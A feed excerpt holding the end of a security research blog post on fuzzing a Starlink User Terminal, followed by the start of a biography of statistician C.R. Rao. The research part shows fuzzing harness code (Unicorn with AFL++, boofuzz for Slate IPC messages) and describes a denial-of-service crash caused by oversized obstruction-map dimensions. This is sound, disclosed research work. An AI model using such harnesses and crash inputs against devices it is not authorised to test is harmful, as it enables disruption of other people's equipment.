    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_X4</span><span>,</span> <span>HEADER_ADDR</span><span>)</span> <span># header buffer address</span>

    <span>return</span> <span>True</span>
</code></pre></div>

<ul>
<li>Identifying function calls, hooking them and emulating them in Python, so that we do not spend time testing library code, nor do we have to load them in memory and handle dynamically loaded libraries.
  As an example, here is how the libc function <code>memcpy</code> is hooked and emulated.</li>
</ul>
<div><pre><span></span><code><span>if</span> <span>address</span> <span>==</span> <span>MEMCPY_ADDR</span><span>:</span>
    <span># read arguments from registers</span>
    <span>dest</span> <span>=</span> <span>mu</span><span>.</span><span>reg_read</span><span>(</span><span>UC_ARM64_REG_X0</span><span>)</span>
    <span>src</span> <span>=</span> <span>mu</span><span>.</span><span>reg_read</span><span>(</span><span>UC_ARM64_REG_X1</span><span>)</span>
    <span>n</span> <span>=</span> <span>mu</span><span>.</span><span>reg_read</span><span>(</span><span>UC_ARM64_REG_X2</span><span>)</span>

    <span># read the data from src</span>
    <span>data</span> <span>=</span> <span>mu</span><span>.</span><span>mem_read</span><span>(</span><span>src</span><span>,</span> <span>n</span><span>)</span>
    <span># write data in dst</span>
    <span>mu</span><span>.</span><span>mem_write</span><span>(</span><span>dest</span><span>,</span> <span>bytes</span><span>(</span><span>data</span><span>))</span>
    <span># return the address of dest </span>
    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_X0</span><span>,</span> <span>dest</span><span>)</span>
    <span># jump to the return address</span>
    <span>lr</span> <span>=</span> <span>mu</span><span>.</span><span>reg_read</span><span>(</span><span>UC_ARM64_REG_LR</span><span>)</span>
    <span>mu</span><span>.</span><span>reg_write</span><span>(</span><span>UC_ARM64_REG_PC</span><span>,</span> <span>lr</span><span>)</span>
</code></pre></div>

<ul>
<li>Identifying an ending point, which has to be a point in the program in which we stop the emulation because the run was successful (no bugs).</li>
</ul>
<p>The nicest thing about using Unicorn, other than being pretty easy to configure and instruct, is the flawless support with <a href="https://aflplus.plus/"><strong>AFL++</strong></a> (American Fuzzy Lop plus plus) which we used as fuzzer.
AFL++ working with Unicorn can detect crashes and most importantly, gather coverage information, in a transparent manner, so that it can perform coverage-guided mutations and setting up the fuzzer with Unicorn is pretty straightforward.
The fuzzer also needs some initial test cases, called seeds, for that we've used some valid headers, taken from sxverity images found in the dish, and some randomly generated headers.</p>
<p>The fuzzer ran for around 24 hours, performing more than one million executions, but unfortunately, no crash was recorded.
This was expected since the tested codebase was very limited and the structure of the input was very simple, not having complex data structures or variable length fields, the most common memory-related bugs are avoided.</p>
<h3>Slate messages</h3>
<p>The other component we tested with fuzzing was Inter-Process Communication (IPC) - which was deeply analyzed in the previous section - since we already had developed a set of tools to analyze and tamper with this communication.
In this case, we are not going to fuzz a single binary, but rather the whole set of processes that form the runtime of the device, since every one of them is using Slate messages to communicate.
The fuzzing approach was completely different from the one we used for sxverity, which was gray-box fuzzing, because:</p>
<ul>
<li>The codebase we are trying to test is enormous.</li>
<li>We weren't able to exactly identify the code that handles slate messages in every binary and, more importantly, bugs can be also found outside this code, because of some inconsistencies in the program state caused by wrongly interpreted inputs.</li>
<li>Binaries need to run in a dish-like environment because they continuously interact with other components of the system, most of them don't even run in our emulated environment.</li>
<li>Also recording coverage would have been challenging, because for that we need to instrument the binaries since we don't have the source code to recompile them, and the fuzzer would need to be run on the dish.</li>
</ul>
<p>For the above reasons, we used black-box fuzzing, without coverage-guided mutations, which is usually called "dumb" fuzzing.
<a href="https://github.com/jtpereyda/boofuzz">Boofuzz</a> was used as fuzzer, it is a simple and easy-to-use fuzzer specifically designed for network protocols, which was a perfect fit for what we were looking for.
Boofuzz does not generate input in a completely random way because you are giving it the protocol definition to be used in the communication, with the possibility of defining sequences of messages using a finite state machine.
In our case, every message was disconnected from the others (apart from the sequence number), so defining the format of messages was enough.
The fuzzer will then mutate every field of the message, by trying some values that could trigger a bug, e.g. for an <code>int32</code> the fuzzer will try values such as <code>{0, 1, -1, INT_MAX, -INT_MAX, ...}</code>.
As an example, here is how some fields of Slate messages are "translated" to Boofuzz protocol definition.</p>
<div><pre><span></span><code><span>if</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"BOOL"</span><span>:</span>
    <span>return</span> <span>Simple</span><span>(</span>
        <span>name</span><span>=</span><span>param</span><span>.</span><span>name</span><span>,</span>
        <span>default_value</span><span>=</span><span>b</span><span>"</span><span>\x00\x00\x00\x00</span><span>"</span><span>,</span>
        <span>fuzz_values</span><span>=</span><span>[</span><span>b</span><span>"</span><span>\x00\x00\x00\x00</span><span>"</span><span>,</span> <span>b</span><span>"</span><span>\x00\x00\x00\x01</span><span>"</span><span>],</span>
    <span>)</span>
<span>if</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"INT8"</span> <span>or</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"UINT8"</span><span>:</span>
    <span>return</span> <span>Byte</span><span>(</span><span>name</span><span>=</span><span>param</span><span>.</span><span>name</span><span>)</span>
<span>if</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"INT32"</span> <span>or</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"UINT32"</span> <span>or</span> <span>param</span><span>.</span><span>dtype</span><span>.</span><span>name</span> <span>==</span> <span>"FLOAT"</span><span>:</span>
    <span>return</span> <span>DWord</span><span>(</span><span>name</span><span>=</span><span>param</span><span>.</span><span>name</span><span>)</span>
</code></pre></div>

<p>Every data type used in the Slate message protocol could be encoded using Boofuzz's standard types, apart from the Sequence number, which needs to store an internal state to increment itself every iteration, you can see its implementation in the following snippet.
Static fields such as the <code>Bwptype</code> and <code>Crc</code> can be encoded using the <code>Static</code> type from Boofuzz.</p>
<div><pre><span></span><code><span>class</span> <span>SequenceNumber</span><span>(</span><span>Fuzzable</span><span>):</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>*</span><span>args</span><span>,</span> <span>**</span><span>kwargs</span><span>):</span>
        <span>super</span><span>()</span><span>.</span><span>__init__</span><span>(</span><span>*</span><span>args</span><span>,</span> <span>**</span><span>kwargs</span><span>,</span> <span>fuzzable</span><span>=</span><span>False</span><span>,</span> <span>default_value</span><span>=</span><span>0</span><span>)</span>
        <span>self</span><span>.</span><span>_curr</span> <span>=</span> <span>0</span>

    <span>def</span> <span>encode</span><span>(</span><span>self</span><span>,</span> <span>value</span><span>:</span> <span>bytes</span> <span>=</span> <span>None</span><span>,</span> <span>mutation_context</span><span>=</span><span>None</span><span>)</span> <span>-&gt;</span> <span>bytes</span><span>:</span>
        <span>curr</span> <span>=</span> <span>self</span><span>.</span><span>_curr</span>
        <span>self</span><span>.</span><span>_curr</span> <span>+=</span> <span>1</span>
        <span>return</span> <span>int</span><span>.</span><span>to_bytes</span><span>(</span><span>curr</span><span>,</span> <span>length</span><span>=</span><span>8</span><span>,</span> <span>byteorder</span><span>=</span><span>"big"</span><span>)</span>
</code></pre></div>

<p>Once the message structure has been defined, the fuzzer can use the code from the Slate injector to send the messages.
The only component that needs to be implemented at this point is something that can detect if a program has crashed after a message was sent.
At first, we were issuing the <code>pgrep</code> command through SSH, but this was adding an overhead that was slowing the fuzzer.
So we've implemented a simple script that runs on the dish, opening a TCP socket and waiting for a connection which will then be used to directly communicate with the fuzzer.
The part of the process monitor that will run on the client (fuzzer machine) can be integrated into the fuzzer, by inheriting Boofuzz's <code>BaseMonitor</code> and implementing its methods, such as <code>alive</code> (check if the target process is still alive) and <code>restart_target</code> (restart the target process).
The resulting architecture is shown in the following figure.</p>
<center>
    <a href="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-fuzzer.png">
        <img src="https://blog.quarkslab.com/resources/2023-08-16_starlink/slate-fuzzer.png" width="80%">
    </a>
</center>
<p>Some crashes were found by fuzzing the <code>control_to_frontend</code> protocol but none of them appeared to be exploitable in ways other than simply crashing the program, causing a Denial of Service for the frontend applications.
This is because the frontend process is a Go binary and the Go runtime makes the process crash (through the <code>panic</code> function) because it detects that something fishy is going on.</p>
<p>As an example, the following are the details of one of these crashes.
In the following snippet, you can see part of the stack trace produced by the Go runtime upon the crash, from which you can understand that the crash is caused by the function <code>UpdateObstructionMap</code>, which tries to allocate too much memory.</p>
<div><pre><span></span><code><span>fatal</span><span> </span><span>error</span><span>:</span><span> </span><span>runtime</span><span>:</span><span> </span><span>out</span><span> </span><span>of</span><span> </span><span>memory</span><span></span>

<span>goroutine</span><span> </span><span>5</span><span> </span><span>[</span><span>running</span><span>]</span><span>:</span><span></span>
<span>[</span><span>...</span><span>]</span><span></span>
<span>runtime</span><span>.(</span><span>*</span><span>mheap</span><span>).</span><span>alloc</span><span>(</span><span>0x5046800</span><span>?</span><span>,</span><span> </span><span>0x28234</span><span>?</span><span>,</span><span> </span><span>0xd0</span><span>?</span><span>)</span><span></span>
<span>[</span><span>...</span><span>]</span><span></span>
<span>main</span><span>.(</span><span>*</span><span>DishControl</span><span>).</span><span>UpdateObstructionMap</span><span>(</span><span>0x40003be000</span><span>,</span><span> </span><span>{</span><span>0x7a90f8</span><span>?</span><span>,</span><span> </span><span>0x4000580380</span><span>?</span><span>}</span><span>)</span><span></span>
<span>[</span><span>...</span><span>]</span><span></span>
</code></pre></div>

<p>By inspecting further this function, we understood how the obstruction map is transferred to the frontend process.
First of all, the obstruction map is a 3D map of the sky above the antenna, indicating whether the antenna has a clear view of the sky or is obstructed by an obstacle such as a tree or other buildings, that the user can see from the frontend applications.
This map is not produced by the frontend process, thus it has to be sent to it through Slate messages.</p>
<div><pre><span></span><code>obstruction_map.config.num_rows                                                 uint32
obstruction_map.config.num_cols                                                 uint32
obstruction_map.current.obstructed                                              bool
obstruction_map.current.index                                                   uint32
</code></pre></div>

<p>In the snippet above you can see part of the message structure definition that carries information about the obstruction map.
The obstruction map is represented in memory as a matrix, in which each point can be obstructed or not.
The control process sends this information by sending one Slate message for each point in the matrix, by setting the right <code>index</code> and setting <code>obstructed</code> to <code>true</code> or <code>false</code>.
The size of the matrix is not fixed, and its dimensions can be set by the control process by using the <code>num_rows</code> and <code>num_cols</code> fields in the message.
This is where the bug resides, in fact when sending big values in these two fields, the program tries to allocate enough memory for the matrix and panics for this reason.</p>
<div><pre><span></span><code><span>len</span><span> </span><span>=</span><span> </span><span>ObstructionMapConfigNumCols</span><span> </span><span>*</span><span> </span><span>ObstructionMapConfigNumRows</span><span>;</span><span></span>
<span>if</span><span> </span><span>(</span><span>len</span><span> </span><span>==</span><span> </span><span>(</span><span>this</span><span>-&gt;</span><span>obstructionMap</span><span>).</span><span>snr</span><span>.</span><span>__count</span><span>)</span><span></span>
<span>    </span><span>goto</span><span> </span><span>LAB_0050b7f4</span><span>;</span><span></span>
<span>(</span><span>this</span><span>-&gt;</span><span>obstructionMap</span><span>).</span><span>numRows</span><span> </span><span>=</span><span> </span><span>ObstructionMapConfigNumRows</span><span>;</span><span></span>
<span>(</span><span>this</span><span>-&gt;</span><span>obstructionMap</span><span>).</span><span>numCols</span><span> </span><span>=</span><span> </span><span>ObstructionMapConfigNumCols</span><span>;</span><span></span>
<span>puVar5</span><span> </span><span>=</span><span> </span><span>runtime</span><span>.</span><span>makeslice</span><span>(</span><span>&amp;</span><span>datatype</span><span>.</span><span>Float32</span><span>.</span><span>float32</span><span>,</span><span>len</span><span>,</span><span>len</span><span>);</span><span></span>
</code></pre></div>

<p>The snippet above shows the decompiled and annotated code of the frontend binary which handles the size of the obstruction upon the reception of a slate message.
Line 1 computes the size of the matrix and line 2 compares it with the current size of the matrix the program has in memory, if the two differ then the dimensions are updated in the internal memory structure on Lines 4 and 5, and then the new matrix is allocated using the <code>makeslice</code> method of the Go runtime on Line 6.
As you can see, no checks are performed on the size to be allocated, nor on the result of the multiplication between the two given dimensions.
This would be very dangerous in C, but the Go runtime handles all the corner cases automatically, by checking that the size of the asked memory is positive and not too big.
The Go runtime also checks every array access, otherwise, an arbitrary write would probably be possible by playing with the index and the size of the matrix.</p>
<p>Note that this bug can only be triggered by sending crafted UDP packets to a service bound to localhost only.
Therefore it is not possible to trigger it from an external network.
Additionally, the <code>iptables</code> configuration of the UT filters out incoming UDP packets, so spoofing packets with a localhost source IP would not work either.
Therefore we did not consider this a vulnerability but merely a bug.</p>
<p>After we implemented the fuzzer and used it in the emulator, we were provided a rooted UT by Starlink, then we confirmed the presence of the aforementioned bug on a real device and fuzzed some more processes that weren't working in the emulator.</p>
<h2>Conclusion</h2>
<p>You can find more details in my master's thesis which will be published at the end of this year, stay tuned!
The presented tools and script can be found in <a href="https://github.com/quarkslab/starlink-tools/">this repo</a>.</p>
<p>This work and the tools we have published are meant to be reused for further research on Starlink's User Terminal.
Unfortunately, due to some technical issues and time constraints, we did not manage to fully inspect the network stack and protocols used in the satellite communications, but hopefully, this knowledge base of the higher-level management function of the runtime can be used in the future to assist in that effort.</p>
<p>I encourage research on this topic also because SpaceX's security team is there to help you and they offer some <a href="https://bugcrowd.com/spacex">juicy bounties</a>.</p>
<p>Many thanks to:</p>
<ul>
<li>Maxime Rossi Bellom, my internship tutor, for guiding me in this research.</li>
<li>Lennert Wouters, who was the author of the blog post regarding the dumping of the firmware and the fault injection attack of Starlink's User Terminal, for helping us in the early stages of this research.</li>
<li>Tim Ferrell, from SpaceX's security team, for sending us a testing dish with root access.</li>
<li>Ivan Arce, Salwa Souaf and Guillaume Valadon for reviewing my blog post.</li>
<li>Many other amazing colleagues for helping me on topics in their fields of expertise.</li>
</ul>

<hr><p>

If you would like to learn more about our security audits and explore how we can help you, <a href="https://content.quarkslab.com/talk-to-our-experts-blog">get in touch with us</a>!

</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[C.R. Rao: A Life in Statistics (2020) (147 pts)]]></title>
            <link>https://bhavana.org.in/c-r-rao-a-life-in-statistics/</link>
            <guid>37307828</guid>
            <pubDate>Tue, 29 Aug 2023 13:44:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://bhavana.org.in/c-r-rao-a-life-in-statistics/">https://bhavana.org.in/c-r-rao-a-life-in-statistics/</a>, See on <a href="https://news.ycombinator.com/item?id=37307828">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

				
<p>Presently into the 100th year of his life of vast experience, living in his Buffalo residence, here is a <a href="https://youtu.be/_T4Oh6tUoR0">video message</a> communicated by his daughter when he turned 99, at the beginning of a year-long celebration, with conferences in his honour at various places.</p>
<div>
<h3>Message from C.R.  Rao</h3>
<figure id="attachment_4140"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/HY13CRRAO_65762e.jpg" alt="c" width="318" height="445" srcset="https://bhavana.org.in/wp-content/uploads/2020/01/HY13CRRAO_65762e.jpg 318w, https://bhavana.org.in/wp-content/uploads/2020/01/HY13CRRAO_65762e-214x300.jpg 214w" sizes="(max-width: 318px) 100vw, 318px"><figcaption><span><strong> courtesy </strong> B.L.S.P.  Rao </span></figcaption></figure>
<p><span>I</span>am honoured and touched that you are celebrating my centenary year. I appreciate your thoughtfulness and kindness.</p>
<p>I started my academic career with a Master’s degree in mathematics. In the early 1940s, the jobs in the field of mathematics were limited. I then stumbled into statistics by chance. Statistics was a relatively new subject in India then. I was one of the first five students to get a Master’s degree in statistics from Calcutta University. My career in statistics progressed as I got a Ph.D. in statistics from Cambridge University and I continued to work at the Indian Statistical Institute in Calcutta. At the Institute, there was a rich, supportive environment to pursue research and to teach, in addition to my administrative responsibilities. After retirement from the Institute, I worked at several universities in the United States, including the University of Pittsburgh and the Pennsylvania State University, which further enriched my experiences.</p>
<p>I was fortunate to have made some fundamental contributions to the field of statistics and to see the impact of my work in furthering research. In my lifetime, I have seen statistics grow into a strong independent field of study based on mathematical, and more recently computational, tools. Its importance has spread across numerous areas such as business, economics, health and medicine, banking, management, physical, natural, and social sciences.</p>
<p>Statistics is the science of learning from data. Today is the age of data revolution. There is therefore, a heightened need for statistics—both in terms of training in statistics to help analyze and interpret the data, and in terms of research to answer new questions arising from the data. The demand for statisticians is growing worldwide. For instance, the US Bureau of Labor lists statistics as one of the fastest growing career fields—and predicts it will grow by 33<span data-display="false">\%</span> between 2016 and 2026.</p>
<p>Therefore, we have our work cut out for us as researchers and as teachers. This is the challenge for all of you.</p>
<p>My best wishes and blessings to all of you—my friends and well-wishers. </p>
<p> 10 September 2019
</p></div>
<p><span>C</span>alyampudi Radhakrishna Rao or C.R.  Rao wrote an autobiographical account “Statistics as a Last Resort”, highlighting the circumstances and influences that led him to a career in statistics and probability. Spending a lifetime putting this chance to work, he has built an inspiring, and a lasting, legacy.</p>
<h3>Early Life </h3>
<p>C.R.  Rao was born to C.D.  Naidu and A.  Laxmikanthamma on 10 September 1920, in Huvvina Hadagalli, then in the integrated Madras Province but now in the state of Karnataka. His father, C.D.  Naidu, was a reputed Inspector of police, working at the Criminal Investigation Department. When Rao was only five years old, in 1925, he was able to memorize multiplication tables up to 16 by 16, which was needed for monetary transactions during the British rule. This was because of the monetary denomination of the Indian rupee at the time, where 16 Annas made a Rupee, 12 Kanis made an Anna and 4 Dammidies made a Kani. Rao’s father’s job required the family to move from place to place every three years, so Rao completed his education in classes two and three at Gudur, classes four and five in Nuzvid and the first and second forms in Nandigrama, all in the present state of Andhra Pradesh.</p>
<p>After retirement, Rao’s father decided to settle down in Visakhapatnam, a coastal city in Andhra Pradesh. Rao finished his high school and obtained his first college degree B.A. (Hons.), with a first class and first rank, in Visakhapatnam. Though Rao’s early childhood involved frequent relocations, they did not affect him since his parents provided him guidance and an environment conducive to excellence in studies and instilled a work ethic that enabled him to achieve higher goals in his life. Rao said that he inherited his father’s analytical ability and his mother’s zeal and industry. His mother was instrumental in instilling a sense of discipline in him. In his book on <i>Statistics and Truth: Putting Chance to Work</i> (1989), Rao acknowledges her contributions to his life with the dedication: </p>
<p>
For instilling in me the quest for knowledge, I owe to my mother, A.  Laxmikanthamma, who, in my younger days, woke me up every day at four in the morning and lit the oil lamp for me to study in the quiet hours of the morning when the mind is fresh.
 </p>
<p>Rao developed a research interest in mathematics during his course of study as a student in the B.A. (Hons.) degree course, at the age of 17, at the Andhra University. He used to solve problems posed in the journal <i>The Mathematics Student</i> and was happy to see his name mentioned as one who solved a problem in a particular issue. His most inspiring teacher was a Cambridge-trained mathematician, Dr.  Vommi Ramaswami, who was the head of the Department of Mathematics. Rao obtained his  B.A. degree at the age of 19 and wanted to pursue a research career in mathematics. With a first class and first rank in his B.A. (Hons.) degree examination, Rao thought he would qualify for a scholarship for further research in mathematics but did not qualify. He then decided to search for a job and saw an advertisement for a mathematician at an army survey unit in North Africa during the Second World War. He went to Calcutta and appeared for an interview for the job but this too eluded him. However, during his stay in Calcutta, he met Mr.  Subramanian, who was employed in Bombay, but had been sent to Calcutta for training in statistics at an institute called the Indian Statistical Institute (ISI). This chance encounter led Rao to join this training program in statistics at ISI, hoping that with this additional qualification, he could get a job. </p>
<figure id="attachment_4142"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/50129.jpg" alt="E.A.Mins/December,1955,A32(r) Dr. C.R. Rao of the Indian Statistical Institute." width="400" height="660"><figcaption>During his ISI days <span><strong> courtesy </strong> B.L.S.P.  Rao </span></figcaption></figure>
<h3>40 years at the Indian Statistical Institute</h3>
<p>Rao joined the ISI in 1941, at the age of 20, and began independent research and published some of these results. He received his M.A. degree in Statistics from Calcutta University in 1943 with a first class, first rank with his score at graduation still an unbroken record. Rao was given the position of a research scholar at ISI in 1943 and a part-time job in Calcutta University to teach a course in statistics. He continued to carry out his independent research on a variety of topics in combinatorics and parametric estimation.</p>
<p>Then, in 1946, the Department of Anthropology at Cambridge University requested the ISI to send a person to analyze measurements made on human skeletons obtained from Jebel Maya in North Africa by the University Museum of Archeology and Anthropology. The goal of the project was to trace the origin of the people who lived there, using the Mahalanobis <span data-display="false">D^2</span> statistic, which was devised by P.C.  Mahalanobis, the founder of the ISI. At that time, the theory behind the statistical analysis of multiple measurements was not well developed. Rao was sent to Cambridge by Mahalanobis as he had the required expertise to work on this problem. Rao worked in Cambridge for two years (1946–48) as a visiting scholar at the Cambridge University Museum of Archeology and Anthropology and developed new methods of analysis of multiple measurements and used them to analyze the data. The results of his work on the skeletal material were published in the book <i>Ancient Inhabitants of Jebel Maya</i> by Cambridge University Press in 1955. During this period, while working in the museum, Rao registered for a Ph.D. degree under the supervision of Sir Ronald A.  Fisher, a towering figure in mathematical statistics. Rao received his Ph.D. in 1948 for his work on developing new multivariate methodology, called Multivariate Analysis of Variance (MANOVA), which generalized ANOVA, as well as other other multivariate tests that he developed while analyzing skeletal data. Much later, in 1974, Cambridge University awarded him an Sc.D. degree in 1974 based on a peer review of his publications and he was made an Honorary Life Fellow of King’s College, Cambridge.</p>
<figure id="attachment_4144"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/msbartlet.jpg" alt="c" width="480" height="415"><figcaption>M.S.  Bartlett and C.R.  Rao <span> Peter Macdonald/Flickr </span></figcaption></figure>
<p>After his two-year stay at Cambridge, he returned to ISI in 1948 and was appointed as a professor at the young age of 28. He worked at ISI in various positions—Head of Research and Training School (RTS), Director of RTS, Director of ISI, Jawaharlal Nehru Professor and National Professor—over a period of 40 years and took mandatory retirement at the age of 60. During this time, he published 201 research papers. Upon his retirement, he accepted positions of distinguished professorships in the U.S. which had minimal teaching responsibilities. He took an appointment as University Professor at the University of Pittsburgh for eight years, and as Eberly Chair Professor of Statistics at Pennsylvania State University for 13 years, continuing his research in diverse areas of statistics. He then retired from Penn State at the age of 81 but continued his research as Director of the Center for Multivariate Analysis at Penn State until 2008. Over this close to forty-year period after his retirement, Rao published another 274 papers!</p>
<h3>Development of statistical education and training at ISI and across India</h3>
<p>
For its [ISI’s] educational programs, the institute needs leaders of mathematical thought like Professor Rao, who can uphold and maintain the high place in the world opinion that Indians have already won.<br>
 —Sir Ronald A. Fisher during his speech at ISI Calcutta, 1963.
 </p>
<p>During his appointment at ISI, Rao developed numerous courses in statistics which were later converted into Bachelor’s and Master’s degrees at ISI when it was declared as an Institute of National Importance by an act of Parliament in 1959 and empowered to offer courses of study leading to degrees in statistics. In fact, the courses that lead to the B.  Stat and M.  Stat degrees at ISI today were worked out by Rao. He also initiated the Ph.D. program in theoretical statistics and probability, with D.  Basu, who is well-known for his seminal contributions to statistics, being Rao’s first Ph.D. student. Over the course of his career, Rao has been as successful with his mentorship of statisticians as he has been with his own research. Rao guided the research work of over fifty doctoral students, and according to the Mathematics Genealogy Project, Rao has nearly 650 academic descendants.</p>
<p>Aside from the B.  Stat and M.  Stat courses, Rao developed other courses to train statisticians to work in different applied areas. These students and trainees, who were deputed by research, government and industrial organizations to study at ISI, were given, in addition to formal lectures, on-the-job training in the design of experiments, biostatistics, industrial quality control and other areas. Rao established research units in ISI to work on special projects in subjects such as economics, sociology, psychology, genetics, anthropology, geology and related areas. The idea of establishing these applied research units was to enable interactions between statisticians and scientists to promote the application of statistical methods in research in other areas and to develop new statistical methods motivated by real problems. Along with Mahalanobis, Rao also played a significant role in establishing an International Statistical Educational Center (ISEC) at ISI in 1950 for training students and statisticians deputed from developing countries. </p>
<figure id="attachment_4149"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/Pic3.jpg" alt="c" width="500" height="638"><figcaption>Receiving Padma Vibhushan honour in 2001 from President K.R. Narayanan  <span> <strong> courtesy </strong>B.L.S. Prakasa Rao</span></figcaption></figure>
<p>During the early years of Rao’s stay at ISI, there was no Ministry for Statistics. But Jawaharlal Nehru, who was the Prime Minister at that time, was greatly interested in the development of statistics for economic planning. Mahalanobis, the founding Director of ISI, was appointed as honorary statistical advisor to the cabinet of the central government in 1949. Nehru visited ISI a number of times at the invitation of Mahalanobis. Rao had the opportunity of discussing with Nehru the national statistical system and training of statisticians to work in state statistical bureaus. Under Mahalanobis’ direction, Rao would help set up state statistical bureaus across India. </p>
<figure id="attachment_4150"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/BRoyFrieden.jpg" alt="c" width="400" height="582"><figcaption>C.R.  Rao and B. Roy Frieden <span><strong> courtesy </strong> B. Roy Frieden </span></figcaption></figure>
<p>Rao was also a member of several government committees for the development of national statistical systems, statistical education and research in India. He served as Chairman of the Committee on Statistics (1962–69), Chairman of the Demographic and Communication for Population control (1968–69), Chairman of the Committee on Mathematics, Atomic Energy Commission, AEC (1969–78), Member of the Committee on Science and Technology, COST (1969–71), and a member of the Justice Sarkar Committee to enquire into the overall functioning of the Council of Scientific and Industrial Research in India.</p>
<h3>Research during 1945-50 at ISI</h3>
<p>
The 1940s were ungrudgingly  C. R. Rao’s. His 1945 paper, which contains the Cramer-Rao Inequality, Rao-Blackwell Theorem, and the beginning of differential geometry of parameter space will guarantee that, even had he done nothing else-but there was much else.<br>
 —Terry Speed, FRS, <i>Institute of Mathematical Statistics Bulletin</i>, Jan–Feb, 2010
 </p>
<p>Rao’s career in statistics is dotted with remarkable achievements. Two of Rao’s papers, written during the 1940s, were reproduced in the book <i>Breakthroughs in Statistics, 1890-1990</i> edited by S. Kotz and N.L. Johnson. One of these papers is “Information and accuracy attainable in the estimation of statistical parameters” (<i>Bull. Cal. Math. Soc</i>. 1945. <b>37</b>: 81–91) and another is “Large sample tests of statistical hypotheses concerning several parameters with applications to problems of estimation” (<i>Cambridge Philos. Soc</i>. 1947. <b>44</b>: 50–57). His 1945 paper opened up several new areas of research and generated several technical terms bearing his name, such as Cramer–Rao inequality and Rao–Blackwellization, concepts which are basic to estimation theory and appear in undergraduate textbooks on statistics and econometrics. The method of Rao–Blackwellization published provides a method by which an unbiased estimator of a parameter can be improved in efficiency when a sufficient statistic for that parameter exists. In fact, in the book <i>Physics from Fisher Information</i>, the author, B.  Roy Frieden, states that “the Heisenberg Uncertainty Principle is an expression of Cramer–Rao Inequality of <i>classical</i> measurement theory….” Physicists have since derived a quantum version of the Cramer–Rao Bound that provides a more stringent version of the uncertainty principle. </p>
<p>In fact, in this 1945 paper, Rao proposed a differential geometric foundation for statistics by introducing a quadratic differential metric in the space of probability measures. The idea of connecting statistics and differential geometry was too early at that time. However, half a century later, his idea has been developed to become one of the most active and important topics in information science connecting statistics, information theory, control theory and statistical physics. The concept of distance between two probability measures introduced by Rao using differential geometric concepts is known as Rao distance. The metric is known as Fisher–Rao metric, since Rao used the notion of Fisher information in defining the quadratic differential metric.  </p>
<figure id="attachment_4151"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/FrankDuckworth-1024x683.jpg" alt="c" width="460" height="465"><figcaption>C.R.  Rao with Frank Duckworth <span><strong> courtesy </strong> B.L.S.P.  Rao </span></figcaption></figure>
<p>The second breakthrough paper published in the <i>Proc. Cambridge Philos. Soc.</i> introduced a new asymptotic test, termed as Rao’s Score Test, as an alternative to the likelihood ratio and Wald tests. These three tests together are known as the holy trinity in statistics. The test appears in books on econometrics and its merits are discussed in various conferences. Some features of this test are discussed in a paper by Chandra and Ghosh (<i>Sankhya A</i>. 1983. <b>45</b>: 228–246).</p>
<p>In another series of papers, Rao developed a theory behind a set of combinatorial arrangements called orthogonal arrays,<sup id="footnote-link-2"><a href="#footnote-2">2</a></sup> which was accepted by the editor “as a fresh and original piece of work”.<sup id="footnote-link-3"><a href="#footnote-3">3</a></sup> Orthogonal arrays have been widely applied in industrial experimentation to determine the optimum mix of factors for maximizing output using observations on a small number of factor combinations. Some of these applications are known as the Taguchi methods, developed by Genichi Taguchi, who learnt about arrays during his visit to ISI. </p>
<p>In another set of papers written during this decade, one of which was on the choice of a minimum set of measurements for analysis,<sup id="footnote-link-4"><a href="#footnote-4">4</a></sup> and another that was the first attempt to represent high-dimensional data in a two- or three-dimensional graph,<sup id="footnote-link-5"><a href="#footnote-5">5</a></sup> Rao laid the foundation of the modern theory of multivariate statistical analysis. Ultimately, most of the papers Rao published during 1945–49 contributed to the development of statistics as an independent discipline. </p>
<h3>Rao’s research from the 1950s onwards</h3>
<p>In statistical parlance, an estimator is said to be first-order efficient if its asymptotic variance attains the Cramer–Rao lower bound. Under some conditions, the first order efficiency holds for a large class of estimators. In order to choose a subclass amongst these first-order efficient estimators that are better than others, Rao introduced a criterion called second-order efficiency.<sup id="footnote-link-6"><a href="#footnote-6">6</a></sup> This is the first paper which initiated studies on higher-order asymptotics of estimators. In another paper in 1995,<sup id="footnote-link-7"><a href="#footnote-7">7</a></sup> Rao used the idea of canonical correlations to estimate dominant factors that explain the correlation between measurements. This method is known as Rao’s canonical factor analysis.</p>
<figure id="attachment_4152"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/CRRAO2010-90thBD04-1024x768.jpg" alt="c" width="697" height="523" srcset="https://bhavana.org.in/wp-content/uploads/2020/01/CRRAO2010-90thBD04.jpg 1024w, https://bhavana.org.in/wp-content/uploads/2020/01/CRRAO2010-90thBD04-300x225.jpg 300w, https://bhavana.org.in/wp-content/uploads/2020/01/CRRAO2010-90thBD04-768x576.jpg 768w, https://bhavana.org.in/wp-content/uploads/2020/01/CRRAO2010-90thBD04-640x480.jpg 640w" sizes="(max-width: 697px) 100vw, 697px"><figcaption>The quintessential family man  <span> Tejaswini Rao </span></figcaption></figure>
